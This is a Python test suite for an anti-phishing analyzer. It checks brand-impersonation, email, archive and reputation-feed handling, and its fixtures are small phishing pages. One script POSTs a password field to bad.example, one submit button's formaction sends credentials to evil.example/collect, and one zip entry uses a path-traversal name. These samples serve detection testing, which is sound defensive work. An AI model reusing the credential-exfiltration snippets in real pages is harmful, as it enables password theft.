from __future__ import annotations

import hashlib
import io
import json
import sqlite3
import zipfile
from email.message import EmailMessage

import pytest

from antiphish.analyzer import Analyzer
from antiphish.config import Limits
from antiphish.models import Verdict
from antiphish.network import FetchResult, safe_http_get
from antiphish.reputation import Feed, install_snapshot, lookup, parse_feed, status
from antiphish.urltools import normalize_url, same_site, unwrap_url


@pytest.mark.parametrize("brand,domain", [("СберБанк","sberbank.ru"),("ВТБ Онлайн","vtb.ru"),("Госуслуги","gosuslugi.ru"),("Т-Банк","tbank.ru"),("Яндекс","yandex.ru"),("Mail.ru","mail.ru"),("Ozon","ozon.ru"),("Wildberries","wildberries.ru")])
def test_russian_brand_same_origin_credentials_and_official_controls(empty_kb,brand,domain):
    body=f"<h1>{brand}</h1><form method=post action='/auth'><input type=password name=pass></form>".encode()
    a=Analyzer(empty_kb)
    bad=a.analyze(body,name="login.html",base_url="https://collector.example/login")
    good=a.analyze(body,name="login.html",base_url=f"https://{domain}/login")
    assert bad.verdict == Verdict.PHISHING
    assert good.verdict == Verdict.NOT_DETECTED


def test_cross_page_signals_never_form_a_block(empty_kb):
    msg=EmailMessage();msg["From"]="admin@corp.ru";msg["Subject"]="documents";msg.set_content("attachments")
    msg.add_attachment(b"<form action='https://auth.corp.ru'><input type=password></form>",maintype="text",subtype="html",filename="login.html")
    msg.add_attachment(b"<a href='https://wrong.example'>https://corp.ru</a>",maintype="text",subtype="html",filename="other.html")
    r=Analyzer(empty_kb).analyze(msg.as_bytes(),name="mail.eml")
    assert len(r.pages)==2
    assert r.verdict != Verdict.PHISHING
    assert len({p.id for p in r.pages})==2


def test_cross_form_script_reads_not_invented(empty_kb):
    body=b"<form action='/local'><input type=password id=pw></form><script>fetch('/analytics',{method:'POST',body:'page loaded'})</script>"
    r=Analyzer(empty_kb).analyze(body,name="ordinary.html",base_url="https://corp.ru/login")
    assert "SCRIPT_EXFILTRATION" not in {e.code for e in r.reason_codes}
    assert r.verdict==Verdict.NOT_DETECTED


def test_two_forms_have_independent_field_destinations(empty_kb):
    body=b"<h1>Microsoft</h1><form action='https://login.microsoft.com'><input type=password id=good></form><form action='/newsletter'><input name=q></form><script>fetch('https://bad.example/x',{method:'POST',body:document.getElementById('good').value})</script>"
    r=Analyzer(empty_kb).analyze(body,name="x.html",base_url="https://bad.example/login")
    assert r.verdict == Verdict.PHISHING
    assert r.pages[0].forms[0].destination_host=="bad.example"


def test_unrelated_brand_in_article_does_not_own_comment_login(empty_kb):
    body="<h1>Новости экономики</h1><p>СберБанк предупреждает: никогда не сообщайте пароль мошенникам.</p><form action='/comments' method=post><input type=password></form>".encode()
    assert Analyzer(empty_kb).analyze(body,name="news.html",base_url="https://news.example/story").verdict==Verdict.NOT_DETECTED


def test_sheet_wrapper_second_page_and_target_are_followed(empty_kb):
    sheet="https://docs.google.com/spreadsheets/d/e/example/pubhtml"
    cell=sheet+"/sheet?headers=false&gid=0"
    target="https://collector.example/login"
    pages={sheet:b"<script>items.push({pageUrl:'https:\\/\\/docs.google.com/spreadsheets/d/e/example/pubhtml/sheet?headers\\x3dfalse&gid=0'})</script>",cell:"<a href='https://www.google.com/url?q=https%3A%2F%2Fcollector.example%2Flogin'>Получить приз</a>".encode(),target:"<h1>Госуслуги</h1><form action='/send' method=post><input type=password></form>".encode()}
    calls=[]
    def fetch(url,limits):
        calls.append(url)
        return FetchResult(pages[url],url,[url],"text/html","200")
    r=Analyzer(empty_kb).analyze(f"<a href='{sheet}'>Приз</a>".encode(),name="mail.html",network="http",fetcher=fetch)
    assert calls==[sheet,cell,target]
    assert r.verdict==Verdict.PHISHING
    assert len(r.routes)>=3


def test_limit_and_cycle_are_reported(empty_kb):
    calls=[]
    def fetch(url,limits):
        calls.append(url)
        return FetchResult(b"<a href='https://route.example/next'>next</a>",url,[url],"text/html","200")
    r=Analyzer(empty_kb,Limits(max_network_pages=1)).analyze("https://route.example/start",network="http",fetcher=fetch)
    assert len(calls)==1
    assert r.configuration['network_analysis_status']=='LIMITED'


def test_raw_token_query_preserved_internally_and_not_exported(empty_kb):
    raw="https://example.ru/view?token=verysecret123&x=a%20b#secretfragment"
    r=Analyzer(empty_kb).analyze(f"<a href='{raw}'>Open</a>".encode(),name="mail.html")
    assert r.urls[0].navigation_url==raw
    serialized=json.dumps(r.to_dict())
    assert 'verysecret123' not in serialized and 'secretfragment' not in serialized
    assert 'navigation_url' not in serialized


def test_shared_hosting_tenants_are_separate_sites():
    assert not same_site("bank.github.io","evil.github.io")
    assert unwrap_url("https://www.google.com/url?q=https%3A%2F%2Fgosuslugi.ru%2F") == "https://gosuslugi.ru/"


def test_bad_href_does_not_abort_good_form(empty_kb):
    body=b"<h1>Microsoft</h1><form action='https://bad.example'><input type=password></form><a href='https://www..broken.example'>broken</a>"
    r=Analyzer(empty_kb).analyze(body,name="mail.html")
    assert r.analysis_status.value=='COMPLETE'
    assert r.verdict==Verdict.PHISHING


def test_archive_nested_html_is_analyzed_and_not_extracted_to_disk(empty_kb):
    blob=io.BytesIO()
    with zipfile.ZipFile(blob,'w') as z:
        z.writestr('../login.html',b"<h1>Microsoft</h1><form action='https://bad.example'><input type=password></form>")
    r=Analyzer(empty_kb).analyze(blob.getvalue(),name="files.zip")
    assert r.verdict==Verdict.PHISHING and len(r.attachments)==1


def test_transport_crcrlf_and_mime_charset_are_repaired(empty_kb):
    msg=EmailMessage();msg['From']='a@example.ru';msg['Subject']='привет'
    msg.set_content("<meta charset=windows-1251><h1>СберБанк</h1><form action='https://bad.example'><input type=password></form>",subtype='html',charset='utf-8')
    r=Analyzer(empty_kb).analyze(msg.as_bytes().replace(b'\n',b'\r\r\n'),name="mail.eml")
    assert r.verdict==Verdict.PHISHING


def test_community_feed_exact_url_does_not_block_host_or_sibling(empty_kb):
    feed=Feed('test','https://feed.example','text','community','license')
    install_snapshot(empty_kb,feed,['https://shared.example/bad'],now=100)
    con=sqlite3.connect(empty_kb)
    try:
        assert lookup(con,'https://shared.example/bad',now=101)
        assert not lookup(con,'https://shared.example/good',now=101)
        assert not lookup(con,'https://shared.example/bad',now=999999)
    finally:con.close()


def test_invalid_feed_preserves_previous_snapshot(empty_kb):
    feed=Feed('test','https://feed.example','text','community','license')
    urls=[f'https://a.example/{i}' for i in range(100)]
    install_snapshot(empty_kb,feed,urls)
    with pytest.raises(ValueError):install_snapshot(empty_kb,feed,urls[:1])
    assert status(empty_kb)['sources'][0]['records']==100
    with pytest.raises(ValueError):parse_feed(feed,b'<html>403 Forbidden</html>')


def test_verified_feed_and_final_url_on_empty_page_are_checked(empty_kb):
    feed=Feed('verified-test','https://feed.example','text','verified','license')
    install_snapshot(empty_kb,feed,['https://bad.example/end'])
    def fetch(url,limits):return FetchResult(b'', 'https://bad.example/end',[url,'https://bad.example/end'],'text/plain','200')
    r=Analyzer(empty_kb).analyze('https://start.example/',network='http',fetcher=fetch)
    assert r.verdict==Verdict.PHISHING


def test_screenshot_sample_hash_is_not_a_block(empty_kb):
    data=b'not really png';digest=hashlib.sha256(data).hexdigest()
    with sqlite3.connect(empty_kb) as con:
        con.execute('INSERT INTO known_hashes VALUES(?,?,?,?,?,?,?)',(digest,'png','PHISHING','case',None,None,'provider-labelled-phishing-sample'))
    assert Analyzer(empty_kb).analyze(data,name='image.bin').verdict==Verdict.NOT_DETECTED


def test_merchant_card_form_and_payment_logos_are_not_brand_impersonation(empty_kb):
    body="<h1>Магазин: оплата заказа</h1><img alt=Visa><img alt=Mastercard><p>Принимаем Visa и Mastercard</p><form action='/pay' method=post><input name=cardnumber><input name=cvv></form>".encode()
    r=Analyzer(empty_kb).analyze(body,name='checkout.html',base_url='https://merchant.example/checkout')
    assert r.verdict==Verdict.NOT_DETECTED


def test_forwarded_message_is_bounded_and_retains_forms(empty_kb):
    inner=EmailMessage();inner['From']='fake@external.example';inner.set_content("<h1>Microsoft</h1><form action='https://bad.example'><input type=password></form>",subtype='html')
    outer=EmailMessage();outer['From']='friend@corp.ru';outer.set_content('Forwarded');outer.add_attachment(inner)
    r=Analyzer(empty_kb).analyze(outer.as_bytes(),name='outer.eml')
    assert r.verdict==Verdict.PHISHING
    assert any(a.media_type=='message/rfc822' for a in r.attachments)


def test_reputation_connections_close_on_windows(empty_kb):
    a=Analyzer(empty_kb);a.analyze('https://example.com',network='offline')
    empty_kb.unlink()
    assert not empty_kb.exists()


def test_submit_button_recipient_overrides_official_action(empty_kb):
    body=b"<h1>Microsoft</h1><form action='https://login.microsoftonline.com/'><input type=password><button type=submit formaction='https://evil.example/collect'>Sign in</button></form>"
    assert Analyzer(empty_kb).analyze(body,name='mail.html').verdict==Verdict.PHISHING


def test_disabled_demo_submission_is_not_proven_collector(empty_kb):
    body=b"<h1>Microsoft</h1><form action='https://external.example/' onsubmit='return false'><input type=password></form>"
    r=Analyzer(empty_kb).analyze(body,name='demo.html')
    assert r.verdict==Verdict.SUSPICIOUS
    assert not any(e.code=='PHISHING_FORM_ROUTE' for e in r.reason_codes)


def test_personal_data_form_on_fake_government_page_is_reviewed(empty_kb):
    body="<h1>Госуслуги</h1><form action='/send'><input name=passport></form>".encode()
    r=Analyzer(empty_kb).analyze(body,name='form.html',base_url='https://fake.example/')
    assert r.verdict==Verdict.SUSPICIOUS


def test_signed_html_query_is_decoded_once_and_redacted_tokens_do_not_collide(empty_kb):
    body=b"<a href='https://example.ru/view?x=A&amp;amp;B'>open</a><a href='https://example.ru/view?token=aaSECRET_ONEzz'>one</a><a href='https://example.ru/view?token=aaSECRET_TWOzz'>two</a>"
    report=Analyzer(empty_kb).analyze(body,name='mail.html')
    assert len(report.urls)==3
    assert report.urls[0].navigation_url=='https://example.ru/view?x=A&amp;B'
    assert 'SECRET' not in json.dumps(report.to_dict())


def test_corrupt_kb_reports_failure_instead_of_raising(tmp_path):
    path=tmp_path/'corrupt.sqlite';path.write_bytes(b'not a SQLite file')
    report=Analyzer(path).analyze(b'<p>hello</p>',name='mail.html')
    assert report.analysis_status.value=='FAILED'


def test_kb_path_with_spaces_and_uri_characters_is_readable(tmp_path):
    from antiphish.kb import initialize_empty_kb
    path=tmp_path/'База #1 ?.sqlite'
    # '?' is not a valid Windows filename, while '#' must be URI escaped.
    path=path.with_name('База #1.sqlite')
    initialize_empty_kb(path)
    assert Analyzer(path).analyze(b'<p>hello</p>',name='mail.html').analysis_status.value=='COMPLETE'


def test_navigation_passes_remaining_total_budget(empty_kb, monkeypatch):
    from antiphish.config import Limits
    from antiphish.network import FetchResult
    clock = [0.0]
    budgets = []
    monkeypatch.setattr('antiphish.traversal.time.monotonic', lambda: clock[0])
    def fetch(url, limits):
        budgets.append(limits.max_network_seconds)
        assert limits.network_timeout_seconds <= limits.max_network_seconds
        clock[0] += 1.8 if len(budgets) == 1 else .2
        return FetchResult(b'<h1>Harmless</h1>',url,[url],'text/html','200')
    body = b"<a href='https://first.example/'>Open</a><a href='https://second.example/'>Open</a>"
    report = Analyzer(empty_kb, Limits(max_network_seconds=2)).analyze(body,name='mail.html',network='http',fetcher=fetch,profile='fast')
    assert report.analysis_status.value == 'COMPLETE'
    assert len(budgets) == 2
    assert budgets[0] == 2
    assert abs(budgets[1] - .2) < .00001
